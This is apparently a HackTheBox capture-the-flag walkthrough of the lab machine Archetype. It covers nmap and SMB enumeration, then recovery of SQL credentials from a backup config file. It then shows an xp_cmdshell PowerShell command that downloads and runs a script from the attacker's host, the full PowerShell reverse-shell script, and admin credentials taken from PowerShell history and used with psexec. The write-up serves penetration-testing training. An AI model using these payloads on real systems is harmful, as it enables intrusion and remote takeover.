# Archetype 10.10.10.27 - HackTheBox Starting Point 

## Enumeration

### Nmap scan

```
nmap -sC -sV -A -oN nmap 10.10.10.27 -v

# Nmap 7.91 scan initiated Wed May  5 01:39:59 2021 as: nmap -sC -sV -A -oN nmap -v 10.10.10.27
Increasing send delay for 10.10.10.27 from 0 to 5 due to 23 out of 75 dropped probes since last increase.
Nmap scan report for 10.10.10.27
Host is up (0.11s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T05:59:53
| Not valid after:  2051-05-05T05:59:53
| MD5:   504c 6d0f 9389 f5de 2cca ae48 097b 337d
|_SHA-1: 2ac9 44e3 d70b 8cd0 4333 f7ad 4e7b 00b3 03c3 66e1
|_ssl-date: 2021-05-05T06:04:21+00:00; +23m55s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h47m55s, deviation: 3h07m50s, median: 23m54s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-04T23:04:11-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-05T06:04:15
|_  start_date: N/A

```

### Smbmap 

```
[+] IP: 10.10.10.27:445 Name: 10.10.10.27               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backups                                                 READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC

```

### Contents of \\\backups

```
smb: \> ls
  .                                   D        0  Mon Jan 20 08:20:57 2020
  ..                                  D        0  Mon Jan 20 08:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 08:23:02 2020

```

### Contents of prod.dstConfig

```
>>> cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>% 

```

### Use of mssqlclient (impacket)

```
[onejump@BlackArchBox]-[~/ctf/HackTheBox/StartingPoint/Archetype]
>>> mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27
SQL> enable_xp_cmdshell
SQL>  xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.10:8888/shell.ps1\");"
```

### shell.ps1

```ps1
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.10",4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |Out-String );$sendback2 = $sendback + "# ";$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

User flag in C:\Users\sql_svc\Desktop\User.txt

## Priv Esc

Powershell history of the user shows admin credentials.

```
#
  type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

### Use of psexec (impacket)

```
 psexec.py administrator@10.10.10.27
```

Root flag in C:\Users\Administrator\Desktop\root.txt

## Credentials

| User | Password |
| --- | --- |
| sql_svc | M3g4c0rp123 |
| administrator | MEGACORP_4dm1n!! |








